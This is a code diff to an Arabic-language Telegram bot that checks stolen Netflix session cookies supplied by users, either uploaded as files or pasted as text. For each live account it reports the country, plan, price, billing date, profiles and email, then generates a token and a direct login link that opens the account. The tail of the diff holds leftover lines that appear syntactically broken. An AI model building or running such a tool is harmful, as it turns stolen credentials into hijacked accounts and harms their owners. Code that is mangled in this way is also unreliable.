@@ -394,7 +394,7 @@ def send_welcome(message):
 def handle_documents(message):
     temp_dirs = []
     try:
-        bot.reply_to(message, "⏳ جاري تحميل الملف وفحص الحسابات سطراً بسطر...")
+        bot.reply_to(message, "⏳ جاري تحميل الملف وفحص الحسابات الشغالة فقط...")
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
@@ -419,7 +419,6 @@ def handle_documents(message):
         valid_count = 0
         for txt_file in txt_files_to_check:
             try:
-                # قراءة الملف سطراً بسطر لمعالجة كل كوكي بمفرده
                 with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                     lines = f.readlines()
                 
@@ -433,25 +432,73 @@ def handle_documents(message):
                         continue
                         
                     account_info = check_netflix_cookie({"NetflixId": netflix_id})
-                    if account_info["ok"]:
+                    
+                    # شرط الصلاحية الحقيقية: يجب أن يكون الحساب شغالاً والباقة ومعلومات التجديد معروفة وليست Unknown
+                    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
                         valid_count += 1
                         token_result = generate_token(netflix_id)
                         
-                        res_msg = "🎬 *حساب NETFLIX صالح وفعال* 🎬\n\n"
-                        res_msg += f"🌍 *البلد:* `{account_info['country']}`\n"
-                        res_msg += f"📦 *الباقة:* `{account_info['plan']}`\n"
-                        res_msg += f"💰 *السعر:* `{account_info['plan_price']}`\n"
-                        res_msg += f"📅 *التجديد:* `{account_info['next_billing']}`\n"
-                        res_msg += f"👥 *الملفات:* `{account_info['profiles']}`\n"
-                        res_msg += f"📧 *البريد:* `{account_info['email']}`\n"
+                        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
+                        res_msg += f"🌍 البلد: `{account_info['country']}`\n"
+                        res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
+                        res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
+                        res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
+                        res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
+                        res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
                         
                         if token_result.get('status') == 'Success':
                             mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
-                            res_msg += f"\n📱 *رابط الدخول المباشر:*\n`{mobile_url}`"
-                        else:
-                            res_msg += f"\n⚠️ *تنبيه:* لم يتم توليد التوكن بنجاح."
+                            res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
                             
                         bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
+                        time.sleep(1)
+            except Exception as e:
+                logger.error(f"Error processing line/file: {e}")
+                
+        bot.reply_to(message, f"✅ انتهى الفحص. تم العثور على وإرسال ({valid_count}) حساب شغال وفعال حقاً.")
+    except Exception as e:
+        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
+    finally:
+        for temp_dir in temp_dirs:
+            try:
+                shutil.rmtree(temp_dir)
+            except:
+                pass
+
+@bot.message_handler(func=lambda message: True)
+def handle_text_message(message):
+    content = message.text
+    if not content or content.startswith('/'):
+        return
+        
+    bot.reply_to(message, "⏳ جاري فحص الكوكي والتحقق من حالته...")
+    netflix_id = extract_netflix_id(content)
+    
+    if not netflix_id:
+        bot.reply_to(message, "❌ لم يتم العثور على `NetflixId` صالح في النص.")
+        return
+        
+    account_info = check_netflix_cookie({"NetflixId": netflix_id})
+    
+    # التحقق من أن الحساب صالح وباقته حقيقية وليست مجهولة
+    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
+        token_result = generate_token(netflix_id)
+        
+        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
+        res_msg += f"🌍 البلد: `{account_info['country']}`\n"
+        res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
+        res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
+        res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
+        res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
+        res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
+        
+        if token_result.get('status') == 'Success':
+            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
+            res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
+            
+        bot.reply_to(message, res_msg, parse_mode='Markdown')
+    else:
+        bot.reply_to(message, "❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو الوهمي).", parse_mode='Markdown')
                         time.sleep(1) # توقف قصير لتفادي حظر تليجرام
             except Exception as e:
                 logger.error(f"Error processing line/file: {e}")
